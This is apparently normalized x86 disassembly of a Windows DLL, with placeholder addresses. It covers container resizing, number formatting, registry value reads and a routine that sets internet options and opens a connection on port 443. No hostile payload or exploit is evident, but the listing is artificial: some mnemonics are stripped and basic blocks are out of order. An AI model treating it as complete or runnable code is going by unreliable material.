push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x4444444
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_100227c0
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_100348f0
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
shl ecx 0x4
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
mov ecx ebx
shl ecx 0x4
sub ecx ebx
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
mov edi [ esi + 0x4 ]
mov eax [ esi ]
push ecx
call sub_10026d80
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x8
sub_10010cd5
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005ab78
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10010d72
push 0x5c
mov eax sub_1007fc71
call sub_1001bb6b
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_10010183
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1003088d
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10008430
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_1000a2b0
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_10067053
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10020b50
mov eax [ ebp - 0x60 ]
call sub_1004fa89
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1003088d
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10008430
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_10010ea0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x78
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_10010ed0
push ebp
mov ebp esp
push 0xffffffff
push sub_100803f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x11b
call sub_10013830
push esi
lea edx [ ebp - 0xac ]
lea ecx [ ebp - 0x3c ]
call sub_1005a590
test eax eax
jne r-xdata
lea esi [ ebp - 0xbc ]
call sub_10005940
lea esi [ ebp - 0xb4 ]
call sub_10005940
lea esi [ ebp - 0xac ]
call sub_10005940
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x13e
call sub_10013830
push esi
lea edx [ ebp - 0xb4 ]
lea ecx [ ebp - 0xa4 ]
call sub_1005a590
test eax eax
jne r-xdata
mov eax [ ebp - 0xac ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0x116
call sub_10013830
push esi
lea edx [ ebp - 0xbc ]
lea ecx [ ebp - 0x70 ]
call sub_1005a590
test eax eax
jne r-xdata
mov eax [ ebp - 0xb4 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
lea esi [ ebp - 0xbc ]
call sub_10005940
lea esi [ ebp - 0xb4 ]
call sub_10005940
lea esi [ ebp - 0xac ]
call sub_10005940
xor eax eax
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_10005940
lea esi [ ebp - 0xb4 ]
call sub_10005940
lea esi [ ebp - 0xac ]
call sub_10005940
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_10005940
lea esi [ ebp - 0xb4 ]
call sub_10005940
lea esi [ ebp - 0xac ]
call sub_10005940
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea esi [ ebp - 0xbc ]
call sub_10005940
lea esi [ ebp - 0xb4 ]
call sub_10005940
lea esi [ ebp - 0xac ]
call sub_10005940
mov eax 0x4
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_1001116c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1006a508
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10006194
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10011224
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_100177a8
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_1001124e
push 0x4c
mov eax sub_1007f9ce
call sub_1001bb6b
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_1004fa89
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10034337
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10039680
push eax
lea ecx [ ebp - 0x58 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10062816
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_10011310
push esi
mov esi eax
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call edi
mov esi [ esi ]
test esi esi
je r-xdata
mov [ esi + 0x20 ] 0x0
pop edi
pop esi
retn
push esi
call edi
sub_10011360
push ebp
mov ebp esp
push ecx
push esi
lea ecx [ eax + eax ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ edi ]
push eax
push 0x0
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
push 0x0
push ecx
push edx
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ edi ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x2
sub_100113a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081c63
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x3c4 ]
mov eax [ esi + 0x3c0 ]
mov [ ebp - 0x48 ] esi
mov ebx edx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x108
call sub_10013830
mov edi [ esi + 0x3a0 ]
mov eax [ esi + 0x3a4 ]
cmp edi eax
je r-xdata
cmp [ eax ] ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
cmp ebx [ ecx ]
je r-xdata
cmp eax ecx
je r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x34 ]
lea ecx [ esi + 0x20 ]
cmp edx 0x10
jb r-xdata
add edi 0x4
cmp edi eax
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
mov esi ecx
mov esi [ ecx ]
jmp r-xdata
jmp r-xdata
add [ esi + 0x3c4 ] 0xfffffff8
jmp r-xdata
lea ecx [ eax - 0x8 ]
lea ecx [ ecx ]
xor edx edx
mov [ ebp - 0x44 ] dx
mov edx [ ebp - 0x48 ]
push edx
push eax
push ecx
lea eax [ ebp - 0x44 ]
xor esi esi
push eax
mov [ ebp - 0x30 ] 0x7
mov [ ebp - 0x34 ] esi
call sub_100150f0
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
lea eax [ ebp - 0x28 ]
lea edx [ esi + 0x4 ]
lea ebx [ eax + 0x2 ]
nop
mov ecx [ ecx ]
mov eax [ ecx + 0x10 ]
add eax esi
cmp edx 0x10
jb r-xdata
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push edx
call sub_10024610
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x3e8
mov [ ebp - 0x4c ] esi
test esi esi
je r-xdata
mov edx [ ebp - 0x44 ]
push edx
call sub_1006591f
add esp 0x4
mov esi [ ebp - 0x48 ]
mov ecx [ esi + 0x3a4 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_10078db0
add esp 0xc
add [ esi + 0x3a4 ] 0xfffffffc
jmp r-xdata
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_10057c30
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ ebp - 0x30 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] ax
call sub_1006591f
add esp 0x4
mov edx [ esi + 0x4 ]
push edx
call sub_1006591f
add esp 0x4
sub_10011560
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_100115a0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_10058a25
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_100115cb
push 0x8
push r--data
call sub_10079bf0
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_10079c35
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1005b7cd
mov [ ebp - 0x4 ] 0xfffffffe
sub_10011620
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10016c16
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_100116c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007ef7c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x100
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor ebx ebx
push ebx
push ebx
push 0x2a
push ebx
mov [ ebp - 0x104 ] eax
mov [ ebp - 0xf0 ] ecx
mov [ ebp - 0x100 ] edx
call [ InternetSetOptionW@IAT ]
mov eax [ ebp + 0x14 ]
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push 0xd
call sub_100372e0
lea eax [ ebp - 0x3c ]
add esp 0x8
mov [ ebp - 0xd0 ] 0xf
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xe4 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push 0xa5
call sub_10035b61
mov esi [ ebp + 0x18 ]
mov edi eax
mov ecx 0x29
[ edi ] [ esi ]
push 0xdc
mov [ ebp - 0xec ] eax
movsb [ edi ] [ esi ]
call sub_10035b61
mov esi eax
mov eax [ ebp - 0xec ]
add esp 0x8
xor edi edi
mov [ ebp - 0xe8 ] eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ ebp - 0x3c ]
push edx
lea ecx [ ebp - 0xe4 ]
call sub_10043190
push 0x4
mov [ ebp - 0x4 ] ebx
call sub_10055606
add esp 0x4
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xe8 ]
mov cx [ eax ]
mov [ esi ] cx
mov dl [ eax + 0x2 ]
mov [ esi + 0x2 ] dl
mov cl [ edi + rw-data ]
mov eax [ esi ]
push ebx
lea edx [ ebp - 0xf8 ]
and eax 0xffffff
mov [ ebp - 0xf4 ] cl
push edx
mov ecx rw-data
mov [ ebp - 0xf8 ] eax
call sub_1001b6b0
push eax
lea eax [ ebp - 0x10c ]
push eax
mov ecx rw-data
call sub_10008df0
add [ ebp - 0xe8 ] 0x3
inc edi
add esi 0x4
cmp edi 0x37
jl r-xdata
xor esi esi
push ebx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov ecx eax
call sub_10022c40
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0xe4 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
call sub_10066fd0
add esp 0x8
cmp [ ebp - 0x60 ] 0x8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
jae r-xdata
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x4 ] bl
cmp esi ebx
jne r-xdata
push ebx
push ebx
push 0x1bb
push ebx
push eax
mov ecx esi
call sub_100057d0
mov edi eax
mov [ ebp - 0xfc ] edi
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
mov eax r--data
jmp r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call sub_1006591f
add esp 0x4
mov esi [ ebp - 0xf0 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ ebp - 0x60 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_10043190
lea eax [ ebp - 0x58 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_1000adb0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
xor ecx ecx
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_1006591f
add esp 0x4
mov esi [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x58 ]
push ecx
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0xe4 ]
push edx
call sub_1006591f
add esp 0x4
mov eax r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_10043190
lea edx [ ebp - 0x58 ]
push edx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_1000adb0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov esi [ ebp - 0x104 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push 0x3
call sub_100372e0
mov eax esi
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x58 ]
push eax
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_10043190
lea edx [ ebp - 0x58 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x90 ]
push ecx
mov [ ebp - 0x4 ] 0x5
call sub_10021390
add esp 0xc
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_1006591f
add esp 0x4
push ebx
push r--data
mov ecx rw-data
call sub_10043190
lea ecx [ ebp - 0x90 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
mov [ ebp - 0x10c ] r--data
mov [ ebp - 0x108 ] ebx
call sub_10066fd0
add esp 0x8
mov esi 0x8
mov [ ebp - 0x4 ] 0x9
cmp [ eax + 0x14 ] esi
jb r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0xb
call sub_100372e0
push rw-data
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
call sub_100430c0
add esp 0x14
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x8
call sub_10035d20
cmp [ ebp - 0x98 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
push 0xa00000
push r--data
lea ecx [ ebp - 0x10c ]
push ecx
push 0x1
push ebx
push eax
push 0x1
mov ecx edi
call sub_1005a280
push eax
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_1001c2b0
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov eax [ eax ]
mov eax [ ebp - 0xac ]
push eax
call sub_1006591f
add esp 0x4
mov esi [ ebp - 0xf8 ]
xor eax eax
mov edi 0x7
mov [ ebp - 0x98 ] edi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] ax
cmp esi ebx
je r-xdata
mov edx [ ebp - 0xac ]
push edx
call sub_1006591f
add esp 0x4
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
push ebx
push ebx
mov ecx esi
call sub_100482d0
test eax eax
je r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0xec ]
push ecx
lea edx [ ebp - 0xf0 ]
push edx
mov ecx esi
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xec ] ebx
call sub_100036b0
cmp [ ebp - 0xec ] ebx
je r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10032440
lea ecx [ ebp - 0x1c ]
push ecx
push 0xe
mov edi eax
call sub_100372e0
sub esp 0x10
mov esi esp
lea eax [ ebp - 0x1c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x100 ] esp
mov [ esi ] bl
lea ecx [ eax + 0x1 ]
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_1006591f
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
push eax
